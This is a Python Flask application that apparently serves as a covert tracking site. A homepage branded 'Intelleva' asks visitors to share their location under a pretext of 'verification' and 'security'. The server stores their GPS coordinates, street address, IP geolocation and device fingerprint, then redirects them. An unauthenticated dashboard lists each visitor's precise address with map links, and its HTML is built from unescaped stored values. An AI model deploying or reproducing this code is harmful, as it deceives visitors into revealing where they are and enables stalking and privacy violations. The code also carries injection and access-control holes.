
import os
import sqlite3
import json
import requests
from flask import Flask, send_file, request, redirect, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)
DATABASE = 'visitors.db'

def init_db():
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()

    # Visitor table (as before)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS visitors (
            ip_address TEXT PRIMARY KEY, last_visit TEXT, location TEXT, 
            latitude REAL, longitude REAL, ip_location_info TEXT, user_agent TEXT, 
            screen_resolution TEXT, language TEXT, platform TEXT, device_pixel_ratio TEXT, 
            cpu_cores INTEGER, memory TEXT, connection_info TEXT, battery_info TEXT, plugins TEXT
        )
    """)

    # New table for settings
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY, 
            value TEXT
        )
    """)
    
    # --- SET DEFAULT VALUES --- 
    default_settings = {
        "WELCOME_TEXT": "Welcome to Intelleva where intellect meets elevate",
        "BUTTON_TEXT": "Visit Intelleva",
        "MODAL_TITLE": "Location Verification",
        "MODAL_BODY": "To continue, we need to verify your location. This helps us personalize your experience and ensure security."
    }

    for key, value in default_settings.items():
        cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (key, value))

    conn.commit()
    conn.close()

init_db()

@app.route("/")
def index():
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("SELECT key, value FROM settings")
    settings_list = cursor.fetchall()
    conn.close()
    
    settings = {row[0]: row[1] for row in settings_list}
    
    with open('src/index.html', 'r') as f:
        template_string = f.read()
        
    return render_template_string(template_string, **settings)


@app.route('/track', methods=['POST'])
def track_and_redirect():
    ip_address = request.remote_addr
    if ip_address == '127.0.0.1':
        try:
            ip_address = requests.get('https://api.ipify.org').text
        except requests.RequestException:
            ip_address = '127.0.0.1'
        
    user_agent = request.headers.get('User-Agent')
    data = request.get_json() or {}
    
    ip_location_info = {}
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}')
        if response.status_code == 200:
            ip_location_info = response.json()
    except requests.RequestException:
        ip_location_info = {"error": "Failed to fetch IP location"}

    db_data = {
        "ip_address": ip_address,
        "last_visit": datetime.now().isoformat(),
        "location": json.dumps(data.get('address', {})),
        "latitude": data.get('latitude'),
        "longitude": data.get('longitude'),
        "user_agent": user_agent,
        "screen_resolution": data.get('screen_resolution'),
        "language": data.get('language'),
        "platform": data.get('platform'),
        "device_pixel_ratio": str(data.get('device_pixel_ratio')),
        "cpu_cores": data.get('cpu_cores'),
        "memory": str(data.get('memory')),
        "connection_info": json.dumps(data.get('connection')),
        "battery_info": json.dumps(data.get('battery')),
        "plugins": json.dumps(data.get('plugins')),
        "ip_location_info": json.dumps(ip_location_info)
    }

    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    columns = ', '.join(db_data.keys())
    placeholders = ', '.join('?' * len(db_data))
    sql = f"INSERT OR REPLACE INTO visitors ({columns}) VALUES ({placeholders})"
    
    cursor.execute(sql, list(db_data.values()))
    conn.commit()
    conn.close()

    return redirect("https://intelleva.app")


# --- NEW: API to Delete a Visitor ---
@app.route('/api/visitors/delete', methods=['POST'])
def delete_visitor():
    data = request.get_json()
    ip_to_delete = data.get('ip_address')
    if not ip_to_delete:
        return jsonify({"success": False, "error": "IP address is required"}), 400

    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("DELETE FROM visitors WHERE ip_address = ?", (ip_to_delete,))
    conn.commit()
    conn.close()

    return jsonify({"success": True})

# --- NEW: API to Update Settings ---
@app.route('/api/settings', methods=['POST'])
def update_settings():
    settings_data = request.get_json()
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    for key, value in settings_data.items():
        cursor.execute("UPDATE settings SET value = ? WHERE key = ?", (value, key))
    conn.commit()
    conn.close()
    return jsonify({"success": True})


@app.route("/api/access/dashboard")
def dashboard():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    
    # Fetch visitors
    cursor.execute("SELECT * FROM visitors ORDER BY last_visit DESC")
    visitors = cursor.fetchall()
    
    # Fetch settings
    cursor.execute("SELECT key, value FROM settings")
    settings_list = cursor.fetchall()
    conn.close()

    settings = {row['key']: row['value'] for row in settings_list}

    # Start building the HTML
    html = """
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Live Visitor Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --color-bg: #1a202c; --color-bg-light: #2d3748; --color-border: #4a5568;
            --color-text: #e2e8f0; --color-text-light: #a0aec0; --color-primary: #38b2ac;
            --color-allowed: #48bb78; --color-denied: #f56565; --color-delete: #e53e3e;
        }
        body { 
            font-family: 'Inter', sans-serif; background-color: var(--color-bg);
            color: var(--color-text); margin: 0; padding: 2rem;
        }
        h1, h2 { text-align: center; color: var(--color-primary); font-weight: 700; }
        
        /* --- NEW: Scrollable Table Container --- */
        .table-wrapper { max-height: 60vh; overflow-y: auto; margin-bottom: 2rem; }
        .table-container { overflow-x: auto; }
        table {
            width: 100%; border-collapse: separate; border-spacing: 0; font-size: 0.875rem;
            box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); border-radius: 0.5rem; overflow: hidden;
        }
        th, td { padding: 1rem 1.25rem; border-bottom: 1px solid var(--color-border); text-align: left; vertical-align: top; white-space: nowrap; }
        thead th { background-color: var(--color-bg-light); color: var(--color-text); font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; }
        tbody tr { transition: background-color 0.2s ease-in-out; }
        tbody tr:nth-child(even) { background-color: var(--color-bg); }
        tbody tr:nth-child(odd) { background-color: var(--color-bg-light); }
        tbody tr:hover { background-color: #4a5568; }
        .status { font-weight: bold; text-align: center; }
        .allowed { color: var(--color-allowed); }
        .denied { color: var(--color-denied); }
        .map-link a { color: var(--color-primary); text-decoration: none; font-weight: 600; }
        .no-visitors { text-align: center; padding: 2rem; }

        /* --- NEW: Delete Button --- */
        .delete-btn {
            background-color: var(--color-delete); color: white; border: none; padding: 0.5rem 1rem;
            border-radius: 0.3rem; cursor: pointer; transition: background-color 0.2s;
        }
        .delete-btn:hover { background-color: #c53030; }

        /* --- NEW: Settings Form --- */
        .settings-container { 
            background-color: var(--color-bg-light); padding: 2rem; border-radius: 0.5rem; margin-top: 2rem; 
        }
        .form-group { margin-bottom: 1.5rem; }
        .form-group label { display: block; margin-bottom: 0.5rem; font-weight: 600; }
        .form-group input, .form-group textarea {
            width: 95%; background-color: var(--color-bg); border: 1px solid var(--color-border);
            color: var(--color-text); padding: 0.75rem; border-radius: 0.3rem;
        }
        .form-group textarea { resize: vertical; }
        .save-btn {
            background-color: var(--color-primary); color: white; border: none; padding: 0.75rem 1.5rem;
            border-radius: 0.3rem; cursor: pointer; font-size: 1rem; display: block; margin: 0 auto;
        }
        #save-feedback { text-align: center; margin-top: 1rem; color: var(--color-allowed); }

    </style>
</head>
<body>
    <h1>Live Visitor Dashboard</h1>
    
    <!-- Table of Visitors -->
    <div id="table-wrapper" class="table-wrapper">
        <div class="table-container">
            <table id="visitor-table">
                <thead><tr>
    """
    
    display_columns = [
        ("gps_permission", "GPS Status"), ("map_link", "Map Link"), ("estimated_location", "Estimated Location (IP)"),
        ("last_visit", "Last Visit"), ("ip_address", "IP Address"), ("location", "Precise Address (GPS)"), 
        ("user_agent", "User Agent"), ("actions", "Actions")  # Added Actions column
    ]

    if not visitors:
        html += "<th class='no-visitors'>No visitors have been recorded yet.</th></tr></thead></table></div></div>"
    else:
        for _, col_name in display_columns:
            html += f"<th>{col_name}</th>"
        html += "</tr></thead><tbody>"

        for visitor in visitors:
            html += f'<tr data-ip="{visitor["ip_address"]}">' # Add data-ip attribute for deletion
            for col_key, _ in display_columns:
                if col_key == "gps_permission":
                    html += f'<td class="status {"Allowed" if visitor["latitude"] else "Denied"}">{"Allowed" if visitor["latitude"] else "Denied"}</td>'
                elif col_key == "map_link":
                    if visitor['latitude'] and visitor['longitude']:
                        map_url = f"https://www.google.com/maps?q={visitor['latitude']},{visitor['longitude']}"
                        html += f'<td class="map-link"><a href="{map_url}" target="_blank">Open Map</a></td>'
                    else:
                        html += "<td>N/A</td>"
                elif col_key == "estimated_location":
                    value = visitor["ip_location_info"]
                    display_text = "N/A"
                    if value and value.startswith('{'):
                        try:
                            ip_info = json.loads(value)
                            city = ip_info.get('city')
                            state = ip_info.get('regionName')
                            display_text = ", ".join(filter(None, [city, state])) or "N/A"
                        except json.JSONDecodeError:
                            display_text = "Invalid Data"
                    html += f"<td>{display_text}</td>"
                elif col_key == "location":
                    value = visitor[col_key]
                    display_text = "N/A"
                    if value and value.startswith('{'):
                        try:
                            addr = json.loads(value)
                            if addr:
                                city_name = addr.get('city') or addr.get('town') or addr.get('village')
                                display_text = ", ".join(filter(None, [addr.get('road'), city_name, addr.get('state')])) or "Details unavailable"
                        except (json.JSONDecodeError, AttributeError):
                            display_text = "Invalid Data"
                    html += f"<td>{display_text}</td>"
                elif col_key == "actions":
                    html += f'<td><button class="delete-btn" onclick="deleteVisitor(\'{visitor["ip_address"]}\')">Delete</button></td>'
                else:
                    value = visitor[col_key]
                    html += f"<td>{value or 'N/A'}</td>"
            html += "</tr>"
        html += "</tbody></table></div></div>"

    # --- NEW: Settings Form ---
    html += f"""
    <div class="settings-container">
        <h2>Homepage Settings</h2>
        <form id="settings-form">
            <div class="form-group">
                <label for="welcome-text">Welcome Text (H1)</label>
                <input type="text" id="welcome-text" name="WELCOME_TEXT" value="{settings.get('WELCOME_TEXT', '')}">
            </div>
            <div class="form-group">
                <label for="button-text">Button Text</label>
                <input type="text" id="button-text" name="BUTTON_TEXT" value="{settings.get('BUTTON_TEXT', '')}">
            </div>
            <div class="form-group">
                <label for="modal-title">Notification Title (H2)</label>
                <input type="text" id="modal-title" name="MODAL_TITLE" value="{settings.get('MODAL_TITLE', '')}">
            </div>
            <div class="form-group">
                <label for="modal-body">Notification Body (Paragraph)</label>
                <textarea id="modal-body" name="MODAL_BODY" rows="3">{settings.get('MODAL_BODY', '')}</textarea>
            </div>
            <button type="submit" class="save-btn">Save Settings</button>
            <p id="save-feedback"></p>
        </form>
    </div>

    <script>
        // --- NEW: Toggle table scrollbar ---
        const table = document.getElementById("visitor-table");
        const wrapper = document.getElementById("table-wrapper");
        if (table.rows.length <= 11) {{ // 1 header row + 10 data rows
            wrapper.style.maxHeight = "none";
            wrapper.style.overflowY = "visible";
        }}

        // --- NEW: Delete visitor function ---
        function deleteVisitor(ip) {{
            if (!confirm('Are you sure you want to delete this visitor? This action cannot be undone.')) return;
            
            fetch('/api/visitors/delete', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ ip_address: ip }})
            }})
            .then(res => res.json())
            .then(data => {{
                if(data.success) {{
                    const row = document.querySelector(`tr[data-ip="${{ip}}"]`);
                    if (row) row.remove();
                }} else {{
                    alert("Error deleting visitor: " + data.error);
                }}
            }})
            .catch(err => alert("An error occurred. Please try again."));
        }}

        // --- NEW: Save settings function ---
        const settingsForm = document.getElementById("settings-form");
        const feedback = document.getElementById("save-feedback");

        settingsForm.addEventListener("submit", function(e) {{
            e.preventDefault();
            const formData = new FormData(settingsForm);
            const settingsData = {{}};
            for (const [key, value] of formData.entries()) {{
                settingsData[key] = value;
            }}

            fetch('/api/settings', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify(settingsData)
            }})
            .then(res => res.json())
            .then(data => {{
                if(data.success) {{
                    feedback.textContent = "Settings saved successfully!";
                    setTimeout(() => feedback.textContent = "", 3000);
                }} else {{
                     feedback.textContent = "Error saving settings.";
                }}
            }})
            .catch(err => feedback.textContent = "An error occurred.");
        }});

    </script>
</body>
</html>
    """
    return html


@app.route("/script.js")
def script():
    return send_file('src/script.js')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
